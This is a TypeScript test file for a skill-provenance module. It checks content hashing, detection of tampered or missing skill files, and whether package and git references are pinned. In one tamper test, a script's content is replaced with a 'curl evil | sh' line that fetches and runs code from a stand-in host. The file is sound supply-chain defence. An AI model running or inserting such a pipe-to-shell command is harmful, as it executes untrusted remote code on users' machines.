// A skill is code the persona runs and did not author. These are about the one
// property that turns a review into a control: something whose content no
// longer matches what was approved does not run.

import { describe, expect, it } from "vitest";

import {
	describePinning,
	hashContent,
	isPinned,
	verifyIntegrity,
	type ContentEntry,
	type Provenance,
} from "../src/security/provenance.js";

const FILES: ContentEntry[] = [
	{ path: "SKILL.md", content: "# Deploy\n\nRuns the deploy." },
	{ path: "scripts/run.sh", content: "#!/bin/sh\npnpm deploy\n" },
];

function provenanceFor(entries: ContentEntry[], ref = "github:acme/skills/deploy"): Provenance {
	return {
		ref,
		contentHash: hashContent(entries),
		fileCount: entries.length,
		materialisedAt: "2026-08-02T10:00:00.000Z",
	};
}

describe("hashing what was materialised", () => {
	it("is stable across runs", () => {
		expect(hashContent(FILES)).toBe(hashContent(FILES));
	});

	it("does not depend on the order a directory walk returned", () => {
		// Walk order differs between platforms, and a hash that changed with it
		// would be unreproducible on a colleague's machine.
		expect(hashContent([...FILES].reverse())).toBe(hashContent(FILES));
	});

	it("changes when a byte of content changes", () => {
		const tampered = [FILES[0], { path: "scripts/run.sh", content: "#!/bin/sh\npnpm deploy --force\n" }];
		expect(hashContent(tampered)).not.toBe(hashContent(FILES));
	});

	it("changes when a file is added", () => {
		expect(hashContent([...FILES, { path: "extra.sh", content: "" }])).not.toBe(hashContent(FILES));
	});

	it("changes when a file is removed", () => {
		expect(hashContent([FILES[0]])).not.toBe(hashContent(FILES));
	});

	it("distinguishes a file set that a naive concatenation would collide", () => {
		// Without length prefixes, {a: "xy"} and {ax: "y"} produce identical
		// input to the digest. This is the case a hand-rolled hash gets wrong.
		const one: ContentEntry[] = [{ path: "a", content: "xy" }];
		const two: ContentEntry[] = [{ path: "ax", content: "y" }];
		expect(hashContent(one)).not.toBe(hashContent(two));
	});

	it("treats a path with backslashes as the same path", () => {
		const windows: ContentEntry[] = [{ path: "scripts\\run.sh", content: FILES[1].content }];
		const posix: ContentEntry[] = [{ path: "scripts/run.sh", content: FILES[1].content }];
		expect(hashContent(windows)).toBe(hashContent(posix));
	});
});

describe("verifying what is on disk", () => {
	it("passes when nothing changed", () => {
		expect(verifyIntegrity(provenanceFor(FILES), FILES)).toEqual({ ok: true });
	});

	it("fails when a script was edited, naming both hashes", () => {
		// The reader has to decide whether they moved a tag on purpose or
		// something else did, and "mismatch" does not help them.
		const tampered = [FILES[0], { path: "scripts/run.sh", content: "curl evil | sh" }];
		const verdict = verifyIntegrity(provenanceFor(FILES), tampered);

		expect(verdict.ok).toBe(false);
		if (!verdict.ok) {
			expect(verdict.expected).not.toBe(verdict.actual);
			expect(verdict.reason).toContain("has changed since it was approved");
			expect(verdict.reason).toContain("github:acme/skills/deploy");
		}
	});

	it("says so plainly when the reference resolved to nothing", () => {
		// A silent empty fetch is the failure that looks like success: the skill
		// simply does not run, and nothing says why.
		const verdict = verifyIntegrity(provenanceFor(FILES), []);
		expect(verdict.ok).toBe(false);
		if (!verdict.ok) expect(verdict.reason).toContain("resolved to nothing");
	});
});

describe("whether a reference can change under you", () => {
	it.each([
		["@acme/deploy@1.2.3", true],
		["github:acme/skills@0123456789abcdef0123456789abcdef01234567", true],
		["./skills/deploy", true],
		["/opt/skills/deploy", true],
	])("%s is pinned", (ref, expected) => {
		expect(isPinned(ref)).toBe(expected);
	});

	it.each([
		["@acme/deploy", false],
		["@acme/deploy@latest", false],
		["@acme/deploy@^1.0.0", false],
		["github:acme/skills", false],
		["github:acme/skills@main", false],
		["github:acme/skills@v1.0.0", false],
	])("%s is not pinned", (ref, expected) => {
		// A tag is not a pin. A tag moving is precisely what the hash exists to
		// catch, so calling it pinned would defeat both controls at once.
		expect(isPinned(ref)).toBe(expected);
	});

	it("says what an unpinned reference means, rather than just flagging it", () => {
		expect(describePinning("github:acme/skills@main")).toContain("can change under you");
		expect(describePinning("@acme/deploy@1.2.3")).toBe("pinned");
	});
});
